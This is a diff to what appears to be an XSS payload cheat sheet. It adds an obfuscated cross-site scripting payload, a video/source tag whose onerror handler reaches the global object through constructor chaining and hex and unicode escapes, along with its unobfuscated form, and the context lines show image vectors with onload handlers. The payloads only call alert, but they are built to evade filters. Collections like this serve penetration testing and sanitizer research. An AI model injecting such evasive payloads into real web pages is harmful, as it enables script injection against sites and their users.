@@ -74,6 +74,12 @@ https://infosecwriteups.com/chaining-self-xss-with-ui-redressing-is-leading-to-s
 Use to trigger image vectors with event handlers different than onerror.
 <img
 <image
+
+Payload:
+<vIdeO><sourCe onerror="['al\u0065'+'rt'][0]['\x63onstructor']['\x63onstructor']('return this')()[['al\u0065'+'rt'][0]]([String.fromCharCode(8238)+[!+[]+!+[]]+[![]+[]][+[]]])">
+
+Payload before obfuscation:
+<video><source onerror="alert.constructor.constructor('return this')().alert('‏0f')">
 src=data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=
 srcset=data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=
 onload=alert(1)>
